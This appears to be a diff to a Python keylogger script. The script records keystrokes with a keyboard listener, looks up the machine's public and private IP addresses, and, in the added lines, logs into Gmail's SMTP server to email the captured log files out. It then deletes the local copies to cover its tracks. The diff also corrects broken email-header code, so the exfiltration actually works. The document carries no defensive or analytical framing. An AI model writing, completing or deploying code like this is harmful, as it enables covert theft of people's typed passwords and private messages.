@@ -14,6 +14,8 @@ from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
 from email import encoders
+import config
+import threading
 
 publicIP = requests.get('https://api.ipify.org').text
 privateIP = socket.gethostbyname(socket.gethostname())
@@ -93,9 +95,9 @@ def write_file(count):
                     subject = f'[{user}] ~ {count}'
 
                     msg = MIMEMultipart()
-                    msg = ['From'] = fromAddr
-                    msg = ['To'] = toAddr
-                    msg = ['subject'] = subject
+                    msg['From'] = fromAddr
+                    msg['To'] = toAddr
+                    msg['Subject'] = subject
                     body = 'testing'
                     msg.attach(MIMEText(body, 'plain'))
 
@@ -109,6 +111,27 @@ def write_file(count):
                     part.add_header('content-disposition','attachment;filename='+str(filename))
                     msg.attach(part)
 
+                    text = msg.as_string()
+
+                    """gmail ip to send message"""
+                    s = smtplib.SMTP('smtp.gmail.com', 587)
+                    s.ehlo()
+                    s.starttls()
+                    s.ehlo()
+                    s.login(fromAddr, fromPswd)
+                    s.sendmail(fromAddr, toAddr, text)
+                    attachment.close()
+                    s.close()
+
+                    """delete file from system"""
+
+                    os.remove(delete_file[0])
+                    del logged_data[1:]
+                    del delete_file[0:]
+
+                    count += 1
+
+                except:
                     pass
 
 
@@ -120,3 +143,6 @@ def on_release(key):
 """keyboard listener"""
 with Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
+
+
+"""Testing"""
